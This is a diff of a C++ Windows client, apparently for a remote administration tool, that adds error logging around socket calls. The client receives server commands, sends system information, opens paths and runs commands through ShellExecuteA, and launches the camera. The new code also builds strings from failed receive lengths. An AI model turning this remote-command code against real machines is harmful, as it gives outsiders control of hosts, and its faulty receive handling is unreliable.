@@ -65,6 +65,7 @@ int main(int argc, char* argv[]) {
         int type;
         bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
         if(bytesRec <= 0) {
+            std::cout << ERROR_PREFIX << " Failed to receive type\n";
             std::cout << SERVER_STATUS_CLOSED;
             break;
         }
@@ -72,6 +73,7 @@ int main(int argc, char* argv[]) {
         if(type == TYPE_TEXT) {
             bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
             if(bytesRec <= 0) {
+                std::cout << ERROR_PREFIX << " Failed to receive type\n";
                 std::cout << SERVER_STATUS_CLOSED;
                 break;
             }
@@ -81,7 +83,9 @@ int main(int argc, char* argv[]) {
 
             std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
             bytesSend = send(sock, clientMessage.c_str(), clientMessage.length(), 0);
-        
+            if(bytesSend <= 0) {
+                std::cout << ERROR_PREFIX << " Failed to send client message\n";
+            }
         }
         
         if(type == TYPE_FILE) {
@@ -93,6 +97,9 @@ int main(int argc, char* argv[]) {
             std::string sysInfo = getSystemInfo();
 
             bytesSend = send(sock, sysInfo.c_str(), sysInfo.length(), 0);
+            if(bytesSend <= 0) {
+                std::cout << ERROR_PREFIX << " Failed to send client information\n";
+            }
 
             std::cout << SUCCESS_PREFIX << " Sent information to the server\n";
         }
@@ -100,37 +107,44 @@ int main(int argc, char* argv[]) {
         if(type == TYPE_EXECUTE) {
             int subtype;
             bytesRec = recv(sock, (char*)&subtype, sizeof(subtype), 0);
+            if(bytesRec <= 0) {
+                std::cout << ERROR_PREFIX << " Failed to receive subtype\n";
+            }
 
             switch(subtype) {
                 case 1: {
                     char pathBuf[BUFFERSIZE];
                     bytesRec = recv(sock, pathBuf, sizeof(pathBuf), 0);
-
-                    if(bytesRec > 0) {
-                        std::string path(pathBuf, bytesRec);
-
-                        std::cout << PENDING_PREFIX << " Opening: '" << path << "'\n";
-                        HINSTANCE verify = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWMAXIMIZED); // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
-
-                        bool shellSuccess = (INT_PTR)verify > 32;
-                        if(shellSuccess) {
-                            std::cout << SUCCESS_PREFIX << " '" << path << "' opened.\n"; 
-                        } else {
-                            std::cout << ERROR_PREFIX << " '" << path << "' failed to open.\n";
-                        }
-
-                        std::string toHostPath = "Successfully opened '" + path + "'";
-                        bytesSend = send(sock, toHostPath.c_str(), toHostPath.length(), 0);
-                    } else {
-                        std::cout << ERROR_PREFIX << " Failed to open path.\n";
+                    if(bytesRec <= 0) {
+                        std::cout << ERROR_PREFIX << " Failed to receive path\n";
                     }
 
+                    std::string path(pathBuf, bytesRec);
+                    std::cout << PENDING_PREFIX << " Opening: '" << path << "'\n";
+                    HINSTANCE verify = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWMAXIMIZED); // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+
+                    bool shellSuccess = (INT_PTR)verify > 32;
+                    if(shellSuccess) {
+                        std::cout << SUCCESS_PREFIX << " '" << path << "' opened.\n"; 
+                    } else {
+                        std::cout << ERROR_PREFIX << " '" << path << "' failed to open.\n";
+                    }
+
+                    std::string toHostPath = "Successfully opened '" + path + "'";
+                    bytesSend = send(sock, toHostPath.c_str(), toHostPath.length(), 0);
+                    if(bytesSend <= 0) {
+                        std::cout << ERROR_PREFIX << " Failed to send path\n";
+                    }
+                    
                     break;
                 }
                 
                 case 2: {
                     char cmdBuf[BUFFERSIZE];
                     bytesRec = recv(sock, cmdBuf, sizeof(cmdBuf), 0);
+                    if(bytesRec <= 0) {
+                        std::cout << ERROR_PREFIX << " Failed to receive command\n";
+                    }
 
                     if(bytesRec > 0) {
                         std::string cmd(cmdBuf, bytesRec);
@@ -155,6 +169,9 @@ int main(int argc, char* argv[]) {
                 case 3:
                 char cmdBuf[BUFFERSIZE];
                 bytesRec = recv(sock, cmdBuf, sizeof(cmdBuf), 0);
+                if(bytesRec <= 0) {
+                    std::cout << ERROR_PREFIX << " Failed to open camera\n";
+                }
 
                 std::string cmd(cmdBuf, bytesRec);
                 ShellExecuteA(NULL, "open", "shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App", NULL, NULL, SW_SHOWNORMAL);
